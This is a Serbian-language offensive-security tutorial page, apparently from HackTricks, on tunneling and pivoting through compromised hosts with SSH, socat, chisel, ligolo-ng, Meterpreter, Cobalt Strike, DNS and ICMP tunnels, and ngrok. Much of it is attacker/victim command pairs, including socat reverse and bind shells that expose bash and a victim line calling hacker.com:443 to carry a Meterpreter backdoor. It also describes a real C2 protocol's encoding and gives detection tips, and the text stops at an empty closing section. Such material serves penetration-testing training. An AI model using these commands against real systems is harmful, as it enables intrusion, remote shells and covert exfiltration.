# Tunneling i Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap savet

> [!WARNING]
> Nmap podrška za proxy je ograničena na TCP veze i ne utiče na ping, skeniranje portova ili detekciju OS-a. Kada je scanner iza SOCKS proxy-ja, **onemogućite otkrivanje hostova** (`-Pn`) i koristite **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Finalna komanda koristi Evil-WinRM opcije `-u` i `-i` za identifikaciju naloga i WinRM hosta; podrazumevani WinRM port je 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH može da prosleđuje X11 veze, proizvoljne TCP portove i Unix-domain socket-e kroz svoj šifrovani kanal.<sup>[[6]](#references)</sup>

SSH grafička veza (X)

`-Y` omogućava trusted X11 forwarding, a `-C` zahteva kompresiju za prosleđene podatke.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Otvorite novi port na SSH Serveru --> drugi port

Remote (`-R`) forwarding osluškuje na SSH serveru i povezuje se sa lokalnom stranom; eksplicitna bind adresa određuje koji interfejsi mogu da pristupe tom listeneru.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokalni port --> Kompromitovani host (SSH) --> Third_box:Port

Lokalno prosleđivanje (`-L`) osluškuje na klijentu i povezuje se sa odredištem sa strane SSH servera.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokalni port --> Kompromitovani host (SSH) --> Bilo gde

Dinamičko prosleđivanje (`-D`) kreira lokalni SOCKS4/SOCKS5 listener čije se konekcije otvaraju sa udaljene strane.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Ovo je korisno za dobijanje reverse shells sa internih hostova kroz DMZ do vašeg hosta:

Podešavanje servera `GatewayPorts` kontroliše da li remote forward može da se binduje izvan loopback adrese; podrazumevana vrednost je `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Ovaj primer zasnovan na root nalogu kreira tun uređaje na oba hosta. Server mora da dozvoli tun forwarding, a izabrani nalog mora da ima pristup tun uređaju; `PermitRootLogin yes` je jedan od načina da se ovde koristi nalog `root`.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Omogućite prosleđivanje na strani servera
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Postavite novu rutu na strani klijenta
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Bezbednost – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 je dodao strict-KEX ekstenziju za suprotstavljanje Terrapin napadu na integritet ranog transporta. Ažurirajte oba peer-a gde je moguće i pratite smernice proizvođača za starije implementacije, umesto da pretpostavite da je prosleđeni kanal zaštićen samo na osnovu verzije.<sup>[[8]](#references)</sup>

## SSHUTTLE

Možete **tunelovati** sav **saobraćaj** ka **podmreži** putem **ssh**-a kroz host.\
Na primer, prosleđivanje svog saobraćaja koji ide ka 10.10.10.0/24

`sshuttle` obezbeđuje transparentno proxy-ovanje preko SSH-a i podržava izbor podmreža i prilagođene SSH komande, kao što je prikazano u nastavku.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Poveži se privatnim ključem
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit-ov `portfwd` podržava lokalno i udaljeno prosleđivanje, dok je njegov SOCKS proxy modul namenjen radu sa session rutama ili `autoroute` i u ovim primerima podrazumevano osluškuje na portu 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Lokalni port --> Kompromitovani host (aktivna sesija) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Drugi način:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike-ov Beacon može prosleđivati SOCKS4a/SOCKS5 veze kroz Beacon; `rportfwd` se vezuje na kompromitovanom hostu, dok `rportfwd_local` pokreće vezu ka odredištu sa Cobalt Strike klijenta.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Otvorite port na Team Server-u na interfejsima koji treba da usmeravaju saobraćaj kroz Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> U ovom slučaju, **port je otvoren na Beacon hostu**, a ne na Team Serveru, i saobraćaj se šalje na Team Server, a odatle na navedeni host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Priručnik za reverse-forwarding navodi sledeće ponašanje:<sup>[[14]](#references)</sup>

- Beacon-ov reverse port forward je namenjen **tunnel-ovanju saobraćaja do Team Server-a, a ne relay-ovanju između pojedinačnih mašina**.
- Saobraćaj je **tunnel-ovan unutar Beacon-ovog C2 saobraćaja**, uključujući P2P linkove.
- Visoki portovi obično izbegavaju ograničenja privilegovanih portova, ali pravila ciljnog OS-a i postojeći listener-i i dalje važe.

### rPort2Port local

> [!WARNING]
> U ovom slučaju, **port se otvara na Beacon hostu**, a ne na Team Server-u, i **saobraćaj se šalje Cobalt Strike klijentu** (ne Team Server-u), a odatle na navedeni host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Projekat obezbeđuje web tunnel endpointe kao što su `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` i `tunnel.php`; otpremite jedan podržani endpoint pre pokretanja lokalnog proxy-ja.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Možete ga preuzeti sa stranice sa izdanjima [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel prenosi TCP/UDP saobraćaj preko HTTP-a koristeći SSH-zaštićenu vezu; koristite kompatibilne client/server build-ove i proverite sintaksu komandi za izabrano izdanje.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Prosleđivanje portova
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart opisuje TUN interfejs na proxy-ju, validaciju fingerprinta sertifikata za agent i podešavanje rute za tunelovanu mrežu.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Povezivanje agenta i osluškivanje

Ligolo-ng može da doda listenere na agentu koji prosleđuju saobraćaj na adresu na strani proxy-ja, a njegov rezervisani opseg `240.0.0.0/4` može da se rutira kako bi se pristupilo servisima lokalnim za agenta.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Pristup lokalnim portovima agenta
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot pokreće obrnuti tunel sa žrtve i izlaže SOCKS4 proxy na loopback adresi napadača; njegov README takođe dokumentuje akreditive NTLM-proxy-ja i opcije za hash.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivotovanje kroz **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kombinuje tipove adresa kao što su `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` i `PROXY`; primeri u nastavku kombinuju te dokumentovane krajnje tačke.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kroz socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kroz SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Možete proći kroz **neautentifikovani proxy** koristeći socat-ov dokumentovani tip adrese `PROXY` tako što ćete izvršiti ovu liniju umesto poslednje u konzoli žrtve.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Kreirajte sertifikate na obe strane: klijentu i serveru
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Povežite lokalni SSH port (22) sa portom 443 na hostu napadača
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink je PuTTY alat za konekcije iz komandne linije, sa opcijama za SSH prosleđivanje sličnim alatu `ssh`.<sup>[[22]](#references)</sup>

Koristite veliko slovo `-P` za SSH port. `-pw` se zadržava radi kompatibilnosti, ali otkriva lozinku u listi procesa; gde je moguće, koristite autentikaciju ključem ili `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Pošto će se ovaj binarni fajl izvršavati na žrtvi i predstavlja SSH klijent, otvorite SSH servis i port za reverse konekciju; u nastavku se koristi `-R` za prosleđivanje lokalno dostupnog porta na napadačevu mašinu.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Koristite kontekst sa dozvolama potrebnim hostu prilikom kreiranja ili menjanja trajnih `portproxy` pravila. Microsoft dokumentuje `v4tov4` forme add, show i delete koje se koriste u nastavku.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Potrebno je da imate **RDP pristup sistemu**.\
Preuzmite:

SocksOverRDP koristi Remote Desktop Dynamic Virtual Channels za prenos SOCKS5 veze preko postojeće RDP sesije; klijentski plugin osluškuje na `127.0.0.1:1080`, dok serverska komponenta radi na RDP odredištu.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) funkciju Remote Desktop Service-a u Windows-u. DVC je zadužen za **tunneling paketa preko RDP veze**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Na svom klijentskom računaru učitajte **`SocksOverRDP-Plugin.dll`** ovako:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sada možemo da se **povežemo** sa **žrtvom** preko **RDP** koristeći **`mstsc.exe`**, i trebalo bi da dobijemo **prompt** sa porukom da je **SocksOverRDP plugin** omogućen i da će **listen** na **127.0.0.1:1080**.

Povežite se putem **RDP** i otpremite i izvršite binarni fajl `SocksOverRDP-Server.exe` na računaru žrtve:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sada potvrdite na svojoj mašini (napadaču) da port 1080 osluškuje:
```
netstat -antb | findstr 1080
```
Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) za prosleđivanje saobraćaja kroz taj port.<sup>[[26]](#references)</sup>

## Proxy-ovanje Windows GUI aplikacija

Možete podesiti da Windows GUI aplikacije pristupaju mreži kroz proxy koristeći [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
U **Profile -> Proxification Rules** dodajte naziv programa koji želite da proxy-ujete i konekcije ka IP adresama koje želite da proxy-ujete; Proxifier pravila mogu da podudaraju aplikacije, ciljne hostove i portove.<sup>[[27]](#references)</sup>

## Tunel kroz NTLM proxy

Prethodno pomenuti alat, **Rpivot**, može prosleđivati saobraćaj kroz proxy koji zahteva NTLM autentifikaciju. **OpenVPN** takođe može rutirati saobraćaj kroz takav proxy kada je podešen sa auth datotekom i NTLMv2 metodom; ovo je prolazak kroz proxy, a ne zaobilaženje proxy autentifikacije.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm se autentifikuje na uzvodne NTLM proxy-je, izlaže lokalne listenere i može da mapira lokalni tunnel port na odredišnu uslugu; klijenti zatim mogu da koriste taj lokalni port.<sup>[[29]](#references)</sup>\
Na primer, time prosleđujemo port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sada, ako na primer na žrtvi podesite **SSH** servis da osluškuje port 443, možete se povezati na njega preko porta 2222 na napadaču.<sup>[[29]](#references)</sup>\
Možete koristiti i **meterpreter** koji se povezuje na localhost:443, dok napadač osluškuje port 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) je Microsoft-ov .NET reverse-proxy toolkit. Možete ga pronaći ovde: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine kreira IPv4 tunel kroz DNS upite i koristi TUN interfejse; dokumentovano podešavanje zahteva privilegije potrebne za kreiranje tih interfejsa na obe strane.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transport ima veći overhead od direktnog TCP-a i obično je spor; možete kreirati kompresovanu SSH konekciju kroz ovaj tunel koristeći:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Preuzmite ga odavde**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 uspostavlja šifrovani command-and-control kanal kroz DNS; komande servera i klijenta u nastavku prate njegovu dokumentovanu upotrebu.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **U PowerShell-u**

Možete koristiti [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) da pokrenete dnscat2 client u PowerShell-u; njegov README dokumentuje parametre `Start-Dnscat2` prikazane ispod.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Prosleđivanje portova pomoću dnscat**

Interaktivna komanda `listen` u okviru Dnscat2 mapira lokalni listener na udaljeni host i port.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Promena proxychains DNS-a

Proxychains-ng dinamički presreće TCP konekcije i ne može da prenosi UDP ili ICMP; DNS proxying je podesiv, zato pregledajte instalirani `proxychains.conf` i resolver helper umesto da pretpostavljate fiksni javni resolver. Legacy `proxyresolv` skripte izlažu `PROXY_DNS_SERVER` za izbor resolvera; koristite resolver dostupan sa pivot-a kada su potrebna interna imena.<sup>[[34]](#references)[[35]](#references)</sup>

## Tuneli u Go-u

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Prilagođeni DNS TXT / HTTP JSON C2 (AK47C2)

Aktor Storm-2603 kreirao je **dual-channel C2 („AK47C2“)** koji zloupotrebljava *samo* odlazni **DNS** i **plain HTTP POST** saobraćaj – dva protokola koja se retko blokiraju na korporativnim mrežama.<sup>[[2]](#references)</sup>

1. **DNS režim (AK47DNS)**
• Generiše nasumični 5-karakterni SessionID (npr. `H4T14`).
• Dodaje `1` za *task requests* ili `2` za *results* i konkatenira različita polja (flags, SessionID, naziv računara).
• Svako polje je **XOR-enkriptovano ASCII ključem `VHBD@H`**, hex-enkodovano i spojeno tačkama – a na kraju se dodaje domen pod kontrolom napadača:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Zahtevi koriste `DnsQuery()` za **TXT** (i rezervni **MG**) records.
• Kada odgovor premaši 0xFF bajtova, backdoor **fragmentira** podatke u delove od 63 bajta i umeće markere:
`s<SessionID>t<TOTAL>p<POS>` kako bi C2 server mogao da ih preuredi.

2. **HTTP režim (AK47HTTP)**
• Formira JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Ceo blob se XOR-uje ključem `VHBD@H` → hex → šalje kao telo **`POST /`** zahteva sa headerom `Content-Type: text/plain`.
• Odgovor prati isto enkodiranje, a polje `cmd` se izvršava pomoću `cmd.exe /c <command> 2>&1`.

Blue Team napomene
• Potražite neuobičajene **TXT queries** čija je prva labela dugačak hexadecimalni niz i koje se uvek završavaju istim retkim domenom.
• Konstantni XOR ključ praćen ASCII-hex vrednostima lako je detektovati pomoću YARA: `6?56484244?484` (`VHBD@H` u hex formatu).
• Za HTTP označite text/plain POST bodies koji sadrže isključivo hex i imaju paran broj bajtova.

{{#note}}
Kanal održava svaku sub-domain labelu unutar DNS limita od 63 okteta, ali sama usklađenost sa protokolom ne znači da je kanal stealthy; retki domeni, dugačke hexadecimalne labele i količina query-ja i dalje predstavljaju signale za detekciju.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans dokumentuje IPv4-over-ICMP tunnel koji koristi TUN uređaj i ICMP echo requests; podešavanje zahteva privilegije dovoljne za kreiranje interfejsa.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Preuzmite ga ovde**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng prenosi TCP konekcije preko ICMP-a i koristi opcije `-p`, `-l`, `-r` i `-R` prikazane u nastavku za proxy, lokalni listener, odredišni host i odredišni port.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) je agent za postavljanje lokalnih mrežnih servisa na internet putem bezbednog tunela; njegova CLI dokumentacija opisuje HTTP, TCP i file URL endpoints, a hostname odštampane endpoint adrese može da se razlikuje u zavisnosti od endpoint-a i naloga.<sup>[[39]](#references)</sup>

### Installation

- Kreirajte nalog: https://ngrok.com/signup
- Client download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Osnovne upotrebe

**Dokumentacija:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent takođe podržava authentication i TLS opcije kada je to potrebno.<sup>[[39]](#references)</sup>_

#### Tunelovanje TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Izlaganje datoteka putem HTTP-a
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Njuškanje HTTP poziva

_Korisno za XSS,SSRF,SSTI ..._\
Samostalni agent podrazumevano izlaže svoj interfejs za inspekciju HTTP saobraćaja na `http://127.0.0.1:4040`; interfejs je namenjen HTTP saobraćaju.<sup>[[40]](#references)</sup>

#### Tunelovanje internog HTTP servisa

Opcija `--host-header=rewrite` prepisuje zaglavlje `Host` uzvodnog HTTP-a tako da odgovara lokalnom servisu.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Jednostavan primer konfiguracije za ngrok.yaml

Ovo koristi ngrok Agent Config v2; imenovani tuneli koriste `proto` i `addr`, a pokreću se pomoću `ngrok start`.<sup>[[42]](#references)</sup> Otvara 3 tunela:

- 2 TCP
- 1 HTTP sa izlaganjem statičkih datoteka iz /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel `cloudflared` konektor uspostavlja izlazne veze; objavljene aplikacije mogu usmeravati HTTP, HTTPS, TCP, SSH i RDP, dok su quick tunnels namenjeni HTTP development-u.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin (legacy režim)

Zastarela opcija `--socks5` govori alatu `cloudflared` da lokalni origin koristi SOCKS5; ona ne kreira lokalni SOCKS5 listener. Za managed tunnel, `originRequest.proxyType: socks` konfiguriše SOCKS5 obradu origina.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Persistentni tuneli sa DNS-om

Lokalno upravljana konfiguracija tunela koristi ključeve napisane malim slovima `tunnel`, `credentials-file` i `url`, kao što je prikazano u nastavku.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Pokrenite konektor:
```bash
cloudflared tunnel run mytunnel
```
Konektor uspostavlja izlazne veze i, podrazumevano, pregovara QUIC uz fallback na HTTP/2; nemojte pretpostaviti da svaka implementacija koristi TCP/443. Pokrenite ga samo sa privilegijama potrebnim za vašu implementaciju.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

